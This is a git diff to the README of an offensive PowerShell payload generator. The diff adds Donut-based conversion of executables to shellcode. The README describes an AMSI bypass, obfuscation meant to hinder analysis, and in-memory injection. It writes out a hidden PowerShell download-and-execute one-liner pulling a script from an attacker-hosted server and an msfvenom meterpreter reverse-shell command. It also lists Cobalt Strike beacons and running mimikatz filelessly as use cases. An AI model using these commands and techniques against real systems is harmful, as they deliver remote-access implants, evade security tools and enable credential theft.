@@ -23,6 +23,14 @@ The authors and contributors assume **NO LIABILITY** for misuse, damage, or ille
 
 ## Features
 
+### 🚀 NEW: EXE to Shellcode Conversion
+- **Direct .exe/.dll to shellcode conversion** using [Donut](https://github.com/TheWover/donut)
+- No need to manually generate raw shellcode
+- Supports x86, x64, and dual-mode (x86+x64) architectures
+- Built-in AMSI/WLDP bypass options
+- Pass command-line parameters to the executable
+- Automatic detection of PE files
+
 ### 🎭 Chimera-Style Obfuscation
 - AMSI bypass string chunking
 - `System.Management.Automation` string obfuscation
@@ -52,16 +60,32 @@ The authors and contributors assume **NO LIABILITY** for misuse, damage, or ille
 ```bash
 git clone <repository-url>
 cd hostpayload
+
+# Install required dependencies (donut-shellcode)
+pip3 install -r requirements.txt
+
+# Make script executable
 chmod +x adaptixpowerShell.py
 ```
+
+**Note:** The `donut-shellcode` Python package is required for .exe to shellcode conversion. If you only plan to use raw shellcode (.bin files), you can skip installing requirements.
 
 ## Usage
 
 ### Basic Usage
 
 ```bash
-# Generate obfuscated payload (default level 3)
+# Generate obfuscated payload from raw shellcode (default level 3)
 python3 adaptixpowerShell.py shellcode.bin
+
+# Generate payload from .exe file (auto-converts to shellcode)
+python3 adaptixpowerShell.py payload.exe -l 4
+
+# Generate payload from .exe with command line parameters
+python3 adaptixpowerShell.py payload.exe -p "arg1 arg2" -l 5
+
+# Specify target architecture for .exe conversion
+python3 adaptixpowerShell.py payload.exe --arch 2  # x64 only
 
 # Specify obfuscation level (1-5)
 python3 adaptixpowerShell.py shellcode.bin -l 4
@@ -99,7 +123,29 @@ The script generates three delivery methods:
 
 ## Examples
 
-### Generate Meterpreter Payload
+### Example 1: Convert .exe to Obfuscated PowerShell Payload
+
+```bash
+# Use any .exe file (Cobalt Strike beacon, custom implant, etc.)
+python3 adaptixpowerShell.py beacon.exe -l 4
+
+# Start web server
+python3 -m http.server 80
+
+# Execute on target
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
+```
+
+### Example 2: Convert .exe with Command Line Parameters
+
+```bash
+# Pass parameters that will be given to the executable at runtime
+python3 adaptixpowerShell.py myapp.exe -p "--config C:\temp\config.ini --verbose" -l 5
+
+# The parameters will be passed to myapp.exe when it runs in memory
+```
+
+### Example 3: Generate Meterpreter Payload (Traditional Method)
 
 ```bash
 # Generate raw shellcode with msfvenom
@@ -117,6 +163,19 @@ python3 -m http.server 80
 powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
 ```
 
+### Example 4: Target Specific Architecture
+
+```bash
+# Generate x64-only payload from .exe
+python3 adaptixpowerShell.py payload.exe --arch 2 -l 4
+
+# Generate x86-only payload from .exe
+python3 adaptixpowerShell.py payload.exe --arch 1 -l 4
+
+# Generate dual-mode payload (x86+x64) - DEFAULT
+python3 adaptixpowerShell.py payload.exe --arch 3 -l 4
+```
+
 ### Debug Mode
 
 Use debug mode to verify decryption is working:
@@ -129,6 +188,22 @@ python3 adaptixpowerShell.py shellcode.bin -d
 
 ## How It Works
 
+### Workflow for .exe Files (NEW)
+
+1. **Donut Conversion**: Converts .exe/.dll to position-independent shellcode
+   - Supports .NET assemblies, native PE files, VBS/JS scripts
+   - Includes built-in AMSI/WLDP bypass
+   - Creates a loader stub that reconstructs the PE in memory
+2. **AMSI Bypass**: Disables AMSI using reflection to access `amsiInitFailed` field
+3. **Encryption**: XOR encrypts the shellcode with a random 16-byte key
+4. **Chunking**: Splits encrypted payload into multiple variables
+5. **Obfuscation**: Applies Chimera-style obfuscation techniques
+6. **Dead Code**: Inserts junk code between variables to hinder human analysis
+7. **Decryption**: PowerShell decrypts XOR payload at runtime
+8. **Injection**: Uses `VirtualAlloc` + `Marshal.Copy` for in-memory execution
+
+### Workflow for Raw Shellcode (.bin Files)
+
 1. **AMSI Bypass**: Disables AMSI using reflection to access `amsiInitFailed` field
 2. **Encryption**: XOR encrypts the shellcode with a random 16-byte key
 3. **Chunking**: Splits encrypted payload into multiple variables
@@ -136,6 +211,39 @@ python3 adaptixpowerShell.py shellcode.bin -d
 5. **Dead Code**: Inserts junk code between variables to hinder human analysis
 6. **Decryption**: PowerShell decrypts XOR payload at runtime
 7. **Injection**: Uses `VirtualAlloc` + `Marshal.Copy` for in-memory execution
+
+## Donut Integration
+
+This tool integrates [Donut](https://github.com/TheWover/donut) - a shellcode generation tool that creates position-independent shellcode payloads from .NET Assemblies, native EXEs/DLLs, VBS/JS/XSL scripts.
+
+### What is Donut?
+
+Donut is a shellcode generation tool that allows you to convert executables into shellcode that can be executed from memory. It:
+
+- Generates position-independent shellcode from EXE/DLL files
+- Supports both .NET assemblies and native PE files
+- Includes built-in AMSI and WLDP bypass capabilities
+- Allows passing command-line parameters to the executable
+- Works on x86, x64, and dual-mode architectures
+
+### Donut Options
+
+| Option | Values | Description |
+|--------|--------|-------------|
+| `-a, --arch` | 1=x86, 2=amd64, 3=x86+amd64 | Target architecture (default: 3) |
+| `-b, --bypass` | 1=none, 2=abort, 3=continue | AMSI/WLDP bypass behavior (default: 3) |
+| `-p, --params` | string | Command line parameters for the executable |
+
+### Example Use Cases
+
+1. **Cobalt Strike Beacon**: Convert beacon.exe to shellcode
+2. **Custom C# Tools**: Execute .NET assemblies in memory
+3. **Mimikatz**: Run mimikatz.exe without touching disk
+4. **Any Windows PE**: Convert any .exe to injectable shellcode
+
+### Detailed Guide
+
+For comprehensive donut usage examples and advanced configurations, see [DONUT_GUIDE.md](DONUT_GUIDE.md)
 
 ## Obfuscation Techniques
 
@@ -239,6 +347,92 @@ python3 adaptixpowerShell.py test.bin -l 3 -d
 # Test execution (should not crash)
 powershell -ExecutionPolicy Bypass -File generated_payload.ps1
 ```
+
+## Troubleshooting
+
+### Large Executable Files (IMPORTANT!)
+
+**⚠️ Payload Size Limitations:**
+
+Large executables (> 1 MB) may produce PowerShell payloads that are too large to execute reliably:
+
+| Executable Size | Payload Size | Status |
+|----------------|--------------|---------|
+| < 100 KB | ~500 KB | ✅ Reliable |
+| 100-500 KB | 1-3 MB | ✅ Good |
+| 500 KB - 1 MB | 3-5 MB | ⚠️ Marginal |
+| 1+ MB (e.g., putty.exe) | 8+ MB | ❌ Problematic |
+
+**Problem:** PowerShell hex encoding inflates shellcode size by ~5x, causing:
+- Memory allocation failures
+- Download timeouts
+- Execution hangs/crashes
+- EDR/AV detection
+
+**Solutions for large executables:**
+
+1. **Use smaller alternatives** (BEST)
+   ```bash
+   # Don't convert full GUI apps
+   # Use purpose-built payloads/beacons instead
+   ```
+
+2. **Use msfvenom shellcode** instead
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_https \
+     LHOST=192.168.1.100 LPORT=443 -f raw -o shell.bin
+   python3 adaptixpowerShell.py shell.bin -l 3
+   # Result: ~300 KB payload vs 8+ MB
+   ```
+
+3. **Reduce settings**
+   ```bash
+   # x64 only + minimal obfuscation
+   python3 adaptixpowerShell.py large.exe --arch 2 -l 1
+   ```
+
+**See [TROUBLESHOOTING_LARGE_PAYLOADS.md](TROUBLESHOOTING_LARGE_PAYLOADS.md) for detailed solutions.**
+
+### Donut Module Not Found
+
+If you get an error about donut not being installed:
+
+```bash
+# Install donut-shellcode
+pip3 install donut-shellcode
+
+# Or install from requirements.txt
+pip3 install -r requirements.txt
+```
+
+### Donut Manual Installation
+
+If pip installation fails, you can install donut manually:
+
+```bash
+git clone https://github.com/TheWover/donut
+cd donut
+pip3 install .
+```
+
+### Testing Donut Conversion
+
+To verify donut is working correctly:
+
+```bash
+# Use a SMALL test file (< 100 KB recommended)
+python3 adaptixpowerShell.py small_test.exe -l 3 -d
+
+# Check output for "Converting test.exe to shellcode using donut..."
+# Verify payload size is reasonable (< 2 MB)
+ls -lh *.ps1
+```
+
+### Architecture Compatibility
+
+- Use `--arch 3` (default) for maximum compatibility (x86+x64)
+- Use `--arch 2` for x64-only targets (smaller payload size)
+- Use `--arch 1` for x86-only targets (legacy systems)
 
 
 ## Credits
